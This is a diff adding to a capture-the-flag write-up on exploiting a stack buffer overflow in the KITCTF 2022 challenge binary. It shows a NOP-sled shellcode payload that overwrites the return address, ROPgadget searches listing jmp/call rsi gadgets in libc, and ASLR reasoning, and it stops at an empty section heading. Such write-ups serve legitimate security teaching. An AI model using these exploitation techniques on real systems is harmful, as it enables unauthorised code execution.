@@ -88,7 +88,7 @@ We have a number of options:
 - Find another address already in the stack that we can slightly change to cause a beneficial code execution to us.  
 
  
-*Testing for Static Stack Addresses*
+*(a) Testing for Static Stack Addresses*
 gdb is, by default, disabling ASLR, so we can see the static stack addresses there.
 By running `info proc mappings` we get:
 `0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rwxp   [stack]`  
@@ -99,5 +99,90 @@ But what's a favorable response?
 We know the server is using `socat` to wait for an incoming TCP connection and then run `main`.  
 `main` is then reading information from `stdin` and writes it to `buffer`. We can tell when `main` stops executing if we look at the TCP connection, for example, using *Wireshark*:  
 
+![](https://github.com/nimrods8/KITCTF-CTF-2022/blob/main/Capture1.PNG)  
 
+The server sends a FIN packet when `main` stops execution. This is because `socat` signals the client that it cannot send anymore packets (by sending FIN), however, `socat` is still receiving, even though `main` has stopped.  
+  
+By sending the following code bytes to the server we are able to check if we can run code using stack addresses:
+  
+```  
+0:  90                      nop
+1:  90                      nop
+2:  90                      nop
+...
+...
+12a:  90                      nop
+12b:  48 c7 c0 ce 13 40 00    mov    rax,0x4013ce
+132:  ff e0                   jmp    rax
+134:  90                      nop
+135:  90                      nop
+136:  90                      nop
+137:  xx xx ff ff ff 7f 00 00      # return address
+```  
 
+Just replace the `xx xx` with addresses...  
+Notice that we are using an absolute jump to 0x4013ce. This is something we can do because `main` was compiled with **no-pie**.
+
+Trying some of the combinations yielded nothing, so we had to go back to the drawing board and concluded that `ASLR` is still on in the target server.
+  
+  
+*(b) Attempting to jump to libc using ROP gadgets*  
+Failing to locate the address of the stack we now look at what we have already present in the return address on the stack, and check if we can use that to gain code execution.  
+The `main` original return address is *7ffff7d86d90*.  So, we turn back to gdb's `info proc mappings` to find what is it?  
+  
+`0x7ffff7d85000     0x7ffff7f1a000   0x195000    0x28000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6`  
+  
+It seems that the `main`'s original return address points inside libc. That's great, so maybe we can run some [ROP gadgets](https://en.wikipedia.org/wiki/Return-oriented_programming) and get a stable code execution on the server!  
+  
+Looking back at the gdb screenshot, we can see that RSI contains the address of `buffer`, and we can write into `buffer`! So if we can somehow find a gadget that runs `jmp rsi` (opcode `ffe6`) or `call rsi` (opcode `ffd6`), we'll be running code on the server!  
+  
+When looking into ROP gadgets there is always the question of which version of `libc` is being used on the server. In our case, this question is promptly answered by Docker... Looking into the `Dockerfile` provided with the challenge, we see:
+  
+`FROM ubuntu:22.04`
+  
+This line means that in building the image of this container, Docker would take the latest ubuntu version 22.04 as the base image. This tells us exactly which `libc` is used by the server.  
+We can use the ROPgadget tool to find `call rsi` gadgets in our version of `libc`:
+```  
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --opcode ffd6
+Opcodes information
+============================================================
+0x000000000002b8ba : ffd6
+0x000000000002bde0 : ffd6
+0x00000000000301cd : ffd6
+0x00000000000436d7 : ffd6
+0x0000000000120e0f : ffd6
+0x00000000001256aa : ffd6
+0x000000000015518c : ffd6  
+```
+  
+and `jmp rsi` gadgets:
+```
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --opcode ffe6
+Opcodes information
+============================================================
+0x000000000003d3cf : ffe6
+0x00000000000519c9 : ffe6
+0x0000000000075343 : ffe6
+0x000000000007547c : ffe6
+0x000000000007562b : ffe6
+0x0000000000075a4b : ffe6
+0x0000000000075a9e : ffe6
+0x0000000000075dcf : ffe6
+0x0000000000075e28 : ffe6
+0x0000000000075e81 : ffe6
+0x0000000000075f96 : ffe6
+0x00000000000761a0 : ffe6
+0x00000000000761d5 : ffe6
+0x0000000000076226 : ffe6
+...
+...
+```  
+
+The `main` returns to address *7ffff7d86d90*, which is 0x1d90 from the beginning of `libc` in memory (which starts at *7ffff7d85000* in our gdb session). When ASLR is on, only the lowest 3 nibbles (*d90*) remain constant, while (in Debian based machines) 28 bits are randomized.
+Since we could not find gadgets in good proximity to the original return address (closest was at zero based address 0x2b8ba), we decided to drop this option and try the third one.  
+  
+  
+*(c) Find another address in stack we can use - or _Live Off the Land_*
+
+  
+  
